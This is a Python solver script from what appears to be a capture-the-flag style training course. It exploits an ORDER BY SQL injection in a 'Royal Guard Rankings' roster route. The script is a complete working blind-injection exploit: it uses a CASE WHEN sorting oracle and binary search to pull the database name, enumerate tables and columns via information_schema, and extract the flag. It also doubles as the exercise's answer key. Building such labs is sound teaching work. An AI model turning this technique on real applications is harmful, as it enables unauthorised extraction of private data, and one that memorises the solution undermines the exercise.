#!/usr/bin/env python3
# solvers/p5_2.py, Task 5.2 "The Royal Guard Rankings" canonical exploit.
#
# challenges/phase5.py's p5_roster() route lists a public roster sorted by a
# caller-supplied `sort` value, spliced straight into ORDER BY via SQLAlchemy's
# text() escape hatch. ORDER BY is an identifier/expression position: a bound
# parameter can only stand in for a value, never for a column or expression,
# so there is no parameterized form of "sort by caller's choice" — the only
# correct fix is an allow-list (learn-orm-injection.md §4).
#
# This script uses Path A: full schema enumeration via information_schema.
# No table or column name is hardcoded. The script discovers them from the
# database's own metadata before extracting anything.
#
# Step sequence:
#   1. Detect injection  — an invalid column is rejected by real SQL, not
#                          an allow-list (proves the input reaches ORDER BY)
#   2. Confirm oracle    — CASE WHEN flips which guard sorts first on 1=1 / 1=2
#   3. Database name     — extract DATABASE() character by character
#   4. Table discovery   — query information_schema.TABLES, exclude guard_roster
#   5. Column discovery  — query information_schema.COLUMNS, exclude id
#   6. Flag extraction   — extract the value character by character

import json
import os
import sys
import urllib.parse
import urllib.request

BASE = os.environ.get("SEIYAKU_BASE", "http://localhost:8000")
ROUTE = f"{BASE}/p5/roster"
EXPECTED_FLAG = "SEIYAKU{order_by_cant_be_bound}"

# CASE branches: TRUE sorts by name (Menthuthuyoupi first),
#                FALSE sorts by division (Neferpitou first).
TRUE_MARKER  = "Menthuthuyoupi"
FALSE_MARKER = "Neferpitou"


def _first_member(sort_value: str):
    qs = urllib.parse.urlencode({"sort": sort_value})
    req = urllib.request.Request(
        f"{ROUTE}?{qs}", headers={"Accept": "application/json"}
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        data = json.loads(resp.read().decode("utf-8"))
    if data.get("error") or not data.get("members"):
        return None, data.get("error")
    return data["members"][0]["name"], None


def oracle(condition: str) -> bool:
    """True if `condition` holds, read off which guard sorts first."""
    first, err = _first_member(f"(CASE WHEN {condition} THEN name ELSE division END)")
    if err:
        raise RuntimeError(f"oracle error: {err!r}")
    return first == TRUE_MARKER


def find_int(sql_expr: str, max_val: int = 128) -> int:
    """Binary-search the value of a SQL integer expression (count, length,
    ASCII value, …). Result is in [0, max_val]."""
    lo, hi = 0, max_val
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"({sql_expr}) <= {mid}"):
            hi = mid
        else:
            lo = mid + 1
    return lo


def extract_string(length: int, ascii_template: str) -> str:
    """Extract a string of known `length`. `ascii_template` must contain
    `{pos}` which is replaced with the 1-indexed character position, e.g.
    'ASCII(SUBSTRING(DATABASE(),{pos},1))'."""
    chars = []
    for pos in range(1, length + 1):
        code = find_int(ascii_template.format(pos=pos), max_val=127)
        chars.append(chr(code))
        sys.stdout.write(chr(code))
        sys.stdout.flush()
    return "".join(chars)


def main() -> int:
    print(f"[p5_2] target: {ROUTE}")

    # --- Step 1: injection detection --------------------------------------
    print("[p5_2] step 1: invalid sort column is rejected (sort reaches SQL)")
    _, err = _first_member("this_column_does_not_exist")
    if err:
        print(f"  ok: invalid column rejected -> {err!r}")
    else:
        print("[p5_2] FAIL: invalid column was NOT rejected; sort may not reach SQL")
        return 1

    # --- Step 2: oracle confirmation -------------------------------------
    print("[p5_2] step 2: confirm the CASE ordering oracle")
    true_first,  _ = _first_member("(CASE WHEN 1=1 THEN name ELSE division END)")
    false_first, _ = _first_member("(CASE WHEN 1=2 THEN name ELSE division END)")
    print(f"  TRUE  (1=1) -> first row {true_first!r}")
    print(f"  FALSE (1=2) -> first row {false_first!r}")
    if true_first == TRUE_MARKER and false_first == FALSE_MARKER:
        print("  ok: oracle produces a crisp, observable true/false signal")
    else:
        print("[p5_2] FAIL: oracle signal not as expected")
        return 1

    # --- Step 3: extract database name via DATABASE() --------------------
    print("[p5_2] step 3: extract current database name via DATABASE()")
    db_len = find_int("LENGTH(DATABASE())")
    print(f"  db name length: {db_len} — extracting: ", end="", flush=True)
    db_name = extract_string(db_len, "ASCII(SUBSTRING(DATABASE(),{pos},1))")
    print(f"\n  ok: database = {db_name!r}")

    # --- Step 4: enumerate hidden tables via information_schema.TABLES ---
    print("[p5_2] step 4: enumerate tables in information_schema (excluding guard_roster)")
    count_tables = (
        "SELECT COUNT(*) FROM information_schema.TABLES "
        "WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME!='guard_roster'"
    )
    table_count = find_int(f"({count_tables})", max_val=32)
    print(f"  hidden table count: {table_count}")
    if table_count == 0:
        print("[p5_2] FAIL: no hidden tables found")
        return 1

    first_table = (
        "SELECT TABLE_NAME FROM information_schema.TABLES "
        "WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME!='guard_roster' "
        "ORDER BY TABLE_NAME LIMIT 1"
    )
    table_len = find_int(f"LENGTH(({first_table}))")
    print(f"  table name length: {table_len} — extracting: ", end="", flush=True)
    table_name = extract_string(table_len, f"ASCII(SUBSTRING(({first_table}),{{pos}},1))")
    print(f"\n  ok: found table {table_name!r}")

    # --- Step 5: enumerate columns via information_schema.COLUMNS --------
    print(f"[p5_2] step 5: enumerate columns in {table_name!r} (excluding id)")
    count_cols = (
        f"SELECT COUNT(*) FROM information_schema.COLUMNS "
        f"WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='{table_name}' "
        f"AND COLUMN_NAME!='id'"
    )
    col_count = find_int(f"({count_cols})", max_val=32)
    print(f"  column count (excl. id): {col_count}")
    if col_count == 0:
        print("[p5_2] FAIL: no columns found on that table")
        return 1

    first_col = (
        f"SELECT COLUMN_NAME FROM information_schema.COLUMNS "
        f"WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='{table_name}' "
        f"AND COLUMN_NAME!='id' ORDER BY ORDINAL_POSITION LIMIT 1"
    )
    col_len = find_int(f"LENGTH(({first_col}))")
    print(f"  column name length: {col_len} — extracting: ", end="", flush=True)
    col_name = extract_string(col_len, f"ASCII(SUBSTRING(({first_col}),{{pos}},1))")
    print(f"\n  ok: found column {col_name!r}")

    # --- Step 6: extract the flag ----------------------------------------
    print(f"[p5_2] step 6: extract flag from {table_name}.{col_name}")
    val_expr = f"SELECT {col_name} FROM {table_name} LIMIT 1"
    val_len = find_int(f"LENGTH(({val_expr}))")
    print(f"  value length: {val_len} — extracting: ", end="", flush=True)
    recovered = extract_string(val_len, f"ASCII(SUBSTRING(({val_expr}),{{pos}},1))")
    print(f"\n[p5_2] recovered flag: {recovered}")

    if recovered == EXPECTED_FLAG:
        print(f"  ok: recovered flag matches: {recovered}")
    else:
        print(f"[p5_2] FAIL: recovered {recovered!r}, expected {EXPECTED_FLAG!r}")
        return 1

    print("[p5_2] ok: schema fully enumerated via information_schema, no names hardcoded")
    print("[p5_2] PASS")
    return 0


if __name__ == "__main__":
    sys.exit(main())
